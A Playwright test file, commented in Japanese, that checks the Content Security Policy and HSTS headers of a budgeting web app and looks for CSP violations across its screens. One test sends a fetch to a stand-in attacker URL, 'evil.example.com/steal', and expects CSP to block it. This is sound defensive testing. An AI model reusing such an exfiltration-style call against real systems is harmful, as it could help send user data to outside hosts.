import { test, expect, type Page } from '@playwright/test';

/**
 * CSP の回帰テスト（#41）。
 *
 * **CSP を締めすぎると本番だけ真っ白になる。** ここが唯一その事故を止める関門。
 * vite preview は vite.config.ts の `preview.headers` から、本番の `_headers` と
 * **同じ securityHeaders()** を返す。つまりこの E2E は本番と同じ CSP の下で動く。
 *
 * **実際に踏んだ地雷（ミューテーションで確認済み）**:
 * ビルド後の CSS はフォントの一部を `url(data:font/woff2;base64,...)` で埋め込む。
 * `font-src` から `data:` を落とすと、ブラウザが
 *   「Loading the font 'data:font/woff2;base64,…' violates … "font-src 'self'"」
 * と言って**そのフォントを捨てる**。これを捕まえるのは下の「全画面を回っても」だけ。
 *
 * **`document.fonts` を見る形のテストは書かないこと。** Material Symbols は
 * `/assets` から（= 'self' で許可される）読まれるので、data: の face が拒否されても
 * status は 'loaded' のままになり、テストが通ってしまう（一度そう書いて素通りした）。
 * 「違反イベントが 0 件であること」を見るのが唯一効く。
 */

/** ページ内で起きた CSP 違反を集める。 */
async function collectViolations(page: Page): Promise<string[]> {
  const violations: string[] = [];
  page.on('console', (m) => {
    if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
  });
  await page.addInitScript(() => {
    const w = window as unknown as { __csp?: string[] };
    w.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      w.__csp!.push(`${e.violatedDirective} が ${e.blockedURI} を拒否`);
    });
  });
  return violations;
}

async function reported(page: Page): Promise<string[]> {
  return page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? []);
}

test('CSP と HSTS が付いていて、script-src が緩んでいない', async ({ page }) => {
  const res = await page.goto('/');
  const csp = res?.headers()['content-security-policy'] ?? '';

  expect(csp).toContain("default-src 'self'");
  expect(csp).toContain("frame-ancestors 'none'");
  // ここが緩むと XSS 耐性が実質ゼロになる
  expect(csp).not.toContain("script-src 'self' 'unsafe-inline'");
  expect(csp).not.toContain('unsafe-eval');
  expect(res?.headers()['strict-transport-security']).toContain('max-age=31536000');
});

test('全画面を回っても CSP 違反が起きない', async ({ page }) => {
  const violations = await collectViolations(page);

  await page.goto('/');
  await page.waitForLoadState('networkidle');

  // ナビゲーションから到達できる画面を一通り踏む（遅延読み込みのチャンクも取りに行く）
  for (const name of ['家計簿', 'サブスク', 'ほしい物', 'グラフ', '設定']) {
    const link = page.getByRole('link', { name }).first();
    if (await link.count()) {
      await link.click();
      await page.waitForLoadState('networkidle');
    }
  }

  expect(violations, `console: ${violations.join(' / ')}`).toHaveLength(0);
  const events = await reported(page);
  expect(events, `event: ${events.join(' / ')}`).toHaveLength(0);
});

// CSP が「付いているつもりで実は効いていない」を検出する。
// 違反ゼロは、ポリシーが無いときも同じように見えるため。
test('許可していないオリジンへの通信は塞がれている', async ({ page }) => {
  await page.goto('/');
  const result = await page.evaluate(async () => {
    try {
      await fetch('https://evil.example.com/steal', { mode: 'no-cors' });
      return 'allowed';
    } catch {
      return 'blocked';
    }
  });
  expect(result).toBe('blocked');
});
